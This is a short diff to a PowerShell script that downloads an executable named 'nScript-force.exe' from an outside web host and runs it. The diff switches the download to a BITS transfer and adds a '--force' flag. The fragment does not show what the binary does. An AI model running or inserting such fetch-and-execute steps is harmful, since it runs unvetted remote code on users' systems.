@@ -19,13 +19,13 @@ try {
     $DownloadUrl = "https://clean.meowery.eu/nScript-force.exe"
     
     Write-Host "[*] Downloading $BinaryName..." -ForegroundColor Yellow
-    Invoke-WebRequest -Uri $DownloadUrl -OutFile $BinaryPath -UseBasicParsing
+    Start-BitsTransfer -Source $DownloadUrl -Destination $BinaryPath
     
     Write-Host "[+] Download complete!" -ForegroundColor Green
     Write-Host ""
 
     # Run the binary
-    & $BinaryPath
+    & $BinaryPath --force
     
     Write-Host ""
     Write-Host "========================================" -ForegroundColor Cyan
